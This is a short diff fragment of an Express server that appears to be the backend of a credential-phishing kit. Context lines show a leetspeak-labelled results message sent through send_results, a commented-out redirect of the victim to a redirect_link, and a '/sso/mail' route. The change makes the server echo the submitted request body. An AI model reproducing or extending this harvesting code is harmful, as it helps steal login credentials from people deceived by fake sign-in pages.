@@ -32,7 +32,7 @@ C1lENT:
 /B1G L0B3/`;
     send_results(message);
     // res.status(200).send(`<!DOCTYPE html><html><body><script>window.location.href = '${redirect_link}';</script></body></html>`);
-    res.status(200).send('good');
+    res.status(200).send(req.body);
 });
 r.get('/sso/mail', (req, res) => {
     const current_directory = path.resolve(__dirname);
